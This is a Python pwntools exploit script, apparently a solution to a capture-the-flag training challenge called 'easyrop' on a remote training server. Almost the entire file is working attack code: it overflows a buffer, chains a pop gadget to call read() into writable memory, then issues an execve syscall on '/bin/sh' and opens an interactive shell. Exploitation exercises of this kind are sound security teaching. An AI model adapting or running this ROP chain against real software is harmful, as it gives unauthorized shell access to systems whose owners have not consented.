#!/usr/bin/python3

from pwn import *
import binascii
SLEEP = 0.001
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
# context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2015
PROG = "./easyrop"
# context.log_level = 'error'
if args.REMOTE:
    SLEEP = 0.1
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    
    b * 0x00400291
    """)
    input("wait for gdb")
else:
    r = process(PROG)


"""
Binary is statically linked, 64 bit, No PIE, No canary, no RELRO
b * 0x00400275
"""

# : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
gadget1 = 0x00000000004001c2 

#syscall
syscall = 0x0000000000400168


read_addr = 0x00400144

prog = ELF(PROG)

null_addr  = next(prog.search(b"\x00"*8))
log.info("Null addr @ 0x%x", null_addr)

def init():
    r.recvuntil("Try easyROP!\n")


def send_payload(payload):
    assert len(payload)% 8 == 0
    for i in range(0, len(payload), 8):
        p1 = payload[i:i+4]
        p2 = payload[i+4:i+8]
        p = [p1, p2]
        assert len(p1) == 4
        assert len(p2) == 4
        for j in range(0,2):
            r.send(p[j])
            sleep(SLEEP)
            r.send(b"\x00\x00\x00\x00")
            sleep(SLEEP)
    # r.send(b"\n")    
    # r.send(b"\n")
    r.sendline()    
    r.sendline()


payload  = p64(0xbeefbeefdeaddead)
payload += p64(0xbeefbeefdeaddead)
payload += p64(0xbeefbeefdeaddead)
payload += p64(0xbeefbeefdeaddead)
payload += p64(0xbeefbeefdeaddead)
payload += p64(0xbeefbeefdeaddead)
payload += p64(0xbeefbeefdeaddead)
# buffer filled

payload += p64(gadget1)     # ret address
payload += p64(0)           # stdin
payload += p64(0x00600370)  # where to write
payload += p64(8)           # count
payload += p64(0)           # rax
payload += p64(read_addr)   # read() addr

## here asks for binsh
payload += p64(gadget1)
payload += p64(0x00600370)
payload += p64(null_addr)
payload += p64(null_addr)
payload += p64(0x3b)           #rax
payload += p64(syscall)

send_payload(payload)
sleep(SLEEP)
r.sendline(b"/bin/sh\x00")        


r.interactive()
